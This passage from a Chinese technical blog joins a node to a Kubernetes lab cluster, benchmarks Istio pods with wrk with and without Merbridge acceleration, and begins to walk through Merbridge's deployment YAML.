class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | \</span></span><br><span class="line">   openssl dgst -sha256 -hex | sed <span class="string">'s/^.* //'</span></span><br></pre></td></tr></table></figure><p>3.从节点执行<code>kubeadm join</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:/etc/kubernetes# swapoff -a</span><br><span class="line">root@ubuntu1:/etc/kubernetes# kubeadm join --token 11sf7j.b46h7ej8l01pddgj 192.168.19.85:6443 --discovery-token-ca-cert-hash sha256:dde9c1d26f1d6178203ed03e6e3e0df6c0d926aa60fba0f0a4e2a88b47b95a69</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'</span><br><span class="line">W0222 09:41:45.561758    4675 utils.go:69] The recommended value for "resolvConf" in "KubeletConfiguration" is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file "/var/lib/kubelet/config.yaml"</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file "/var/lib/kubelet/kubeadm-flags.env"</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>4.主节点查看nodes情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/etc/kubernetes# kubectl get nodes</span><br><span class="line">NAME      STATUS   ROLES                  AGE     VERSION</span><br><span class="line">ubuntu    Ready    control-plane,master   12d     v1.23.3</span><br><span class="line">ubuntu1   Ready    &lt;none&gt;                 2m46s   v1.23.4</span><br></pre></td></tr></table></figure><p>5.查看pod的分布情况</p><p>192.168.19.85</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS       AGE   IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-bhv2h             2/2     Running   26 (40h ago)   12d   10.244.0.175    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-gh4sf           2/2     Running   0              39h   10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-glxpg          2/2     Running   0              39h   10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-p6k2w         2/2     Running   26 (40h ago)   12d   10.244.0.171    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-k84kr              2/2     Running   26 (40h ago)   12d   10.244.0.179    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-q6f62             2/2     Running   26 (40h ago)   12d   10.244.0.168    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-cqq2r             2/2     Running   26 (40h ago)   12d   10.244.0.180    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-gr42h             2/2     Running   26 (40h ago)   12d   10.244.0.173    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-k8ncb                  2/2     Running   0              39h   10.244.1.2      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-z6pqt    1/1     Running   13 (40h ago)   12d   10.244.0.178    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-cdkwd   1/1     Running   13 (40h ago)   12d   10.244.0.176    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-8nqqb                 1/1     Running   14 (40h ago)   12d   10.244.0.174    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-8xrmh                 1/1     Running   15 (40h ago)   13d   10.244.0.169    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-cv77n                 1/1     Running   14 (40h ago)   13d   10.244.0.181    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   16 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-87xdz                   1/1     Running   18 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-drk55                   1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9rwc5                        1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-qkcxz                        1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><p>192.168.19.84</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS      AGE     IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-7qwql             2/2     Running   2 (23h ago)   6d16h   10.244.0.34     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-28pm4           2/2     Running   0             22h     10.244.1.5      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-rs5ch          2/2     Running   0             22h     10.244.1.6      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-kt88j         2/2     Running   2 (23h ago)   6d16h   10.244.0.31     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-8bdk9              2/2     Running   2 (23h ago)   6d16h   10.244.0.35     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-nf4xd             2/2     Running   2 (23h ago)   6d16h   10.244.0.25     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-sdjzs             2/2     Running   2 (23h ago)   6d16h   10.244.0.24     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-p6vdg             2/2     Running   2 (23h ago)   6d16h   10.244.0.26     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-qncjl                  2/2     Running   0             22h     10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   1 (23h ago)   6d17h   10.244.0.29     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   1 (23h ago)   6d17h   10.244.0.32     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-4ww7r                 1/1     Running   1 (23h ago)   6d17h   10.244.0.23     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-9kmsk                         1/1     Running   1 (23h ago)   5d21h   10.244.0.28     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-jqt9x                         1/1     Running   7 (23h ago)   23h     10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-87slm                 1/1     Running   1 (23h ago)   6d17h   10.244.0.36     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-ld7cp                 1/1     Running   1 (23h ago)   6d17h   10.244.0.33     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-7lvxj                   1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-fqtst                   1/1     Running   1 (23h ago)   6d16h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9kwsc                        1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-p8nw9                        1/1     Running   1 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><h5 id="外部向pod发送请求"><a href="#外部向pod发送请求" class="headerlink" title="外部向pod发送请求"></a>外部向pod发送请求</h5><h6 id="集群内"><a href="#集群内" class="headerlink" title="集群内"></a>集群内</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.83</code>机器上的pod发送请求(没有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.83:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.83:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.62s   294.11ms   1.97s    66.67%</span><br><span class="line">    Req/Sec     9.85      8.67    50.00     78.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.73s</span><br><span class="line">     75%    1.85s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.97s</span><br><span class="line">  108 requests in 10.07s, 530.88KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 99</span><br><span class="line">Requests/sec:     10.72</span><br><span class="line">Transfer/sec:     52.72KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.82</code>机器上的pod发送请求(有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.82:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.82:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.65s   252.43ms   1.99s    53.33%</span><br><span class="line">    Req/Sec    20.50     14.91    70.00     67.33%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.71s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.99s</span><br><span class="line">  233 requests in 10.10s, 1.12MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 218</span><br><span class="line">Requests/sec:     23.08</span><br><span class="line">Transfer/sec:    113.95KB</span><br></pre></td></tr></table></figure><h6 id="集群间"><a href="#集群间" class="headerlink" title="集群间"></a>集群间</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.84</code>机器上的pod发送请求(其中84上部署了merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.54s   365.46ms   1.96s    70.00%</span><br><span class="line">    Req/Sec    16.30     11.91    60.00     72.84%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.79s</span><br><span class="line">     75%    1.88s</span><br><span class="line">     90%    1.95s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  157 requests in 10.10s, 770.66KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 137</span><br><span class="line">Requests/sec:     15.55</span><br><span class="line">Transfer/sec:     76.33KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.85</code>机器上的pod发送请求(其中85没有部署merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.23s   671.98ms   1.82s   100.00%</span><br><span class="line">    Req/Sec    10.85      7.15    30.00     50.85%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.80s</span><br><span class="line">     75%    1.82s</span><br><span class="line">     90%    1.82s</span><br><span class="line">     99%    1.82s</span><br><span class="line">  84 requests in 10.10s, 412.15KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 80</span><br><span class="line">Requests/sec:      8.32</span><br><span class="line">Transfer/sec:     40.81KB</span><br></pre></td></tr></table></figure><h5 id="同一node下pod间发送请求"><a href="#同一node下pod间发送请求" class="headerlink" title="同一node下pod间发送请求"></a>同一node下pod间发送请求</h5><h6 id="pod内安装wrk"><a href="#pod内安装wrk" class="headerlink" title="pod内安装wrk"></a>pod内安装wrk</h6><p>进入pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it &lt;pod-name&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>安装wrk压测工具发现无法执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin            dev            etc            lib            mnt            proc           run            srv            tmp            var</span><br><span class="line">cacert.pem     entrypoint.sh  home           media          opt            root           sbin           sys            usr</span><br><span class="line">/ $ sudo</span><br><span class="line">/bin/sh: sudo: not found</span><br><span class="line">/ $ apt</span><br><span class="line">/bin/sh: apt: not found</span><br></pre></td></tr></table></figure><p>解决办法：<a href="https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found" target="_blank" rel="noopener">https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found</a></p><p>通过docker以root身份进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it --user=root &lt;CONTAINER ID&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>使用apk命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ # apk update</span><br><span class="line">/ # apk add Package</span><br><span class="line">这里需要安装的package如下</span><br><span class="line">- gcc</span><br><span class="line">- make</span><br><span class="line">- automake</span><br><span class="line">- autoconf</span><br><span class="line">- libtool</span><br><span class="line">- linux-headers</span><br><span class="line">- libc-dev</span><br></pre></td></tr></table></figure><p>在wrk目录下执行make</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # make</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-k8ncb</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-gh4sf</code>的pod发起请求。这两个pod同属于<code>192.168.19.83</code>节点，在该node下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.180.145:5000</span><br><span class="line">Running 10s test @ http://10.101.180.145:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency   757.70ms  403.53ms   1.54s    51.72%</span><br><span class="line">    Req/Sec    20.85     30.78   170.00     94.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%  724.43ms</span><br><span class="line">     75%    1.09s</span><br><span class="line">     90%    1.31s</span><br><span class="line">     99%    1.54s</span><br><span class="line">  136 requests in 10.22s, 52.28KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 107</span><br><span class="line">  Non-2xx or 3xx responses: 136</span><br><span class="line">Requests/sec:     13.31</span><br><span class="line">Transfer/sec:      5.12KB</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-qncjl</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-28pm4</code>的pod发起请求。这两个pod同属于<code>192.168.19.82</code>节点，在该node部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.187.77:5000</span><br><span class="line">Running 10s test @ http://10.101.187.77:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.91s    20.63ms   1.98s    82.22%</span><br><span class="line">    Req/Sec    78.02     96.83   495.00     86.67%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.92s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.92s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  461 requests in 10.10s, 177.23KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 416</span><br><span class="line">  Non-2xx or 3xx responses: 461</span><br><span class="line">Requests/sec:     45.67</span><br><span class="line">Transfer/sec:     17.56KB</span><br></pre></td></tr></table></figure><h5 id="不同node下pod间发送请求"><a href="#不同node下pod间发送请求" class="headerlink" title="不同node下pod间发送请求"></a>不同node下pod间发送请求</h5><p>在node为<code>192.168.19.83名为sleep-698cfc4445-k8ncb</code>的pod下，对node为<code>192.168.19.85名为productpage-v1-65b75f6885-p6k2w</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.69s     0.00us   1.69s   100.00%</span><br><span class="line">    Req/Sec     5.98      4.32    20.00     75.47%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.69s</span><br><span class="line">     75%    1.69s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.69s</span><br><span class="line">  62 requests in 10.04s, 304.85KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 61</span><br><span class="line">Requests/sec:      6.17</span><br><span class="line">Transfer/sec:     30.35KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.82名为sleep-698cfc4445-qncjl</code>的pod下，对node为<code>192.168.19.84名为productpage-v1-65b75f6885-kt88j</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.48s   258.10ms   1.80s    83.33%</span><br><span class="line">    Req/Sec    15.02     14.04    90.00     84.54%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.58s</span><br><span class="line">     75%    1.64s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.80s</span><br><span class="line">  188 requests in 10.08s, 0.90MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 158</span><br><span class="line">Requests/sec:     18.66</span><br><span class="line">Transfer/sec:     91.41KB</span><br></pre></td></tr></table></figure><h5 id="拓展：从控制平面节点以外的计算机控制集群"><a href="#拓展：从控制平面节点以外的计算机控制集群" class="headerlink" title="拓展：从控制平面节点以外的计算机控制集群"></a>拓展：从控制平面节点以外的计算机控制集群</h5><p>从节点查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure><p>出现这个问题的原因是kubectl命令需要使用<code>kubernetes-admin</code>来运行，解决方法如下，将主节点中的<code>/etc/kubernetes/admin.conf</code>文件拷贝到从节点相同目录下，然后配置环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo "export KUBECONFIG=/etc/kubernetes/admin.conf" &gt;&gt; ~/.bash_profile</span><br><span class="line">root@ubuntu:~# source ~/.bash_profile</span><br></pre></td></tr></table></figure><p>再次查看pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   24         11d</span><br><span class="line">helloworld-v1-fdb8c8c58-9nqw8     2/2     Running   0          5d</span><br><span class="line">helloworld-v2-5b46bc9f84-gdzvl    2/2     Running   0          5d</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   24         11d</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   24         11d</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   24         11d</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   24         11d</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   24         11d</span><br><span class="line">sleep-698cfc4445-8nncn            2/2     Running   0          5d1h</span><br></pre></td></tr></table></figure><h4 id="merbridge-yaml文件解析-istio"><a href="#merbridge-yaml文件解析-istio" class="headerlink" title="merbridge yaml文件解析(istio)"></a>merbridge yaml文件解析(istio)</h4><p><a href="https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml</a></p><p>第一段，创建对象类别，这里是集群角色</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1 #创建该对象所使用的 Kubernetes API 的版本</span><br><span class="line">kind: ClusterRole 